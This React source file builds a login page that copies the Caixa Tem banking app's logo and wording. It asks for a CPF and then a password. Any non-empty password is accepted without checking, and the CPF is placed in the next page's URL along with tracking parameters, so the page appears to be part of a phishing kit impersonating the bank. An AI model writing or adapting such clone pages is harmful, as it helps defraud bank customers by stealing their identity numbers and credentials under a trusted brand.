import { useState } from 'react';
import { useLocation } from 'wouter';
import { motion } from 'framer-motion';
import { User, KeyRound, Eye, EyeOff, HelpCircle } from 'lucide-react';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import caixaLogo from '@assets/caixa tem logo.webp';
import { prepareUrlWithParams } from '../lib/utmHandler';

export default function Login() {
  const [, navigate] = useLocation();
  const [cpf, setCpf] = useState('');
  const [step, setStep] = useState(1); // 1 = CPF, 2 = Senha
  const [senha, setSenha] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  // Formata o CPF enquanto digita
  const handleCPFChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, ''); // Remove todos os não-dígitos
    
    if (value.length <= 11) {
      // Formata o CPF como 000.000.000-00
      let formattedValue = value;
      if (value.length > 3) {
        formattedValue = value.replace(/^(\d{3})(\d)/, '$1.$2');
      }
      if (value.length > 6) {
        formattedValue = formattedValue.replace(/^(\d{3})\.(\d{3})(\d)/, '$1.$2.$3');
      }
      if (value.length > 9) {
        formattedValue = formattedValue.replace(/^(\d{3})\.(\d{3})\.(\d{3})(\d)/, '$1.$2.$3-$4');
      }
      
      setCpf(formattedValue);
    }
  };

  const handleNextStep = () => {
    if (step === 1) {
      // Validação simples de CPF (deve ter 11 dígitos)
      const numericCPF = cpf.replace(/\D/g, '');
      if (numericCPF.length === 11) {
        setStep(2);
      }
    } else {
      // Validação simples de senha (deve ter pelo menos 1 caractere)
      if (senha.length > 0) {
        // Extrair CPF sem formatação
        const numericCPF = cpf.replace(/\D/g, '');
        
        // Redirecionar para a página principal com nome e CPF
        navigate(prepareUrlWithParams(`/home/${encodeURIComponent('Usuario')}/${numericCPF}`));
      }
    }
  };

  const handleBackClick = () => {
    if (step === 2) {
      setStep(1);
    } else {
      navigate(prepareUrlWithParams('/welcome'));
    }
  };

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  return (
    <div className="min-h-screen w-full flex flex-col bg-white">
      <header className="bg-white p-4 flex flex-col items-center">
        <img src={caixaLogo} alt="CAIXA" className="w-24 h-auto mb-2" />
        <p className="text-blue-600 text-sm font-medium">Aplicativo Caixa Tem</p>
      </header>
      
      <motion.div 
        className="flex-1 p-6 flex flex-col"
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.3 }}
      >
        {step === 1 ? (
          <>
            <h2 className="text-blue-600 text-lg mb-6">
              Informe seu CPF e clique em "Próximo" para continuar:
            </h2>
            
            <div className="relative mb-8">
              <User className="absolute left-0 top-1/2 -translate-y-1/2 text-gray-400" size={20} />
              <Input
                type="text"
                value={cpf}
                onChange={handleCPFChange}
                placeholder="CPF"
                className="pl-8 border-t-0 border-l-0 border-r-0 border-b-2 border-orange-400 rounded-none focus-visible:ring-0 focus-visible:border-orange-500"
                maxLength={14}
              />
            </div>
            
            <Button
              onClick={handleNextStep}
              className="w-full py-6 bg-orange-500 hover:bg-orange-600 text-white font-medium rounded-md transition-colors mb-4"
            >
              Próximo
            </Button>
            
            <p className="text-blue-600 mb-6">
              É novo por aqui? <a href="#" className="underline">Cadastre-se e abra a sua conta</a>
            </p>
            
            <div className="mt-auto flex justify-center">
              <Button
                variant="ghost"
                className="text-blue-600 flex items-center"
                onClick={() => {}}
              >
                <HelpCircle className="mr-2" size={18} />
                Preciso de ajuda
              </Button>
            </div>
          </>
        ) : (
          <>
            <h2 className="text-blue-600 text-lg mb-6">
              Informe sua senha:
            </h2>
            
            <div className="relative mb-8">
              <KeyRound className="absolute left-0 top-1/2 -translate-y-1/2 text-gray-400" size={20} />
              <Input
                type={showPassword ? "text" : "password"}
                value={senha}
                onChange={(e) => setSenha(e.target.value)}
                placeholder="Senha"
                className="pl-8 pr-10 border-t-0 border-l-0 border-r-0 border-b-2 border-orange-400 rounded-none focus-visible:ring-0 focus-visible:border-orange-500"
              />
              <button
                type="button"
                onClick={togglePasswordVisibility}
                className="absolute right-0 top-1/2 -translate-y-1/2 text-gray-400"
              >
                {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
              </button>
            </div>
            
            <div className="grid grid-cols-2 gap-4 mb-4">
              <Button
                onClick={handleBackClick}
                variant="outline"
                className="py-6 border-orange-400 text-orange-500 hover:bg-orange-50"
              >
                Voltar
              </Button>
              
              <Button
                onClick={handleNextStep}
                className="py-6 bg-orange-500 hover:bg-orange-600 text-white"
              >
                Entrar
              </Button>
            </div>
            
            <p className="text-blue-600 mb-6 text-center">
              <a href="#" className="underline">Esqueceu sua senha?</a> <a href="#" className="underline">Recuperar Senha</a>
            </p>
            
            <div className="mt-auto flex justify-center">
              <Button
                variant="ghost"
                className="text-blue-600 flex items-center"
                onClick={() => {}}
              >
                <HelpCircle className="mr-2" size={18} />
                Preciso de ajuda
              </Button>
            </div>
          </>
        )}
      </motion.div>
    </div>
  );
}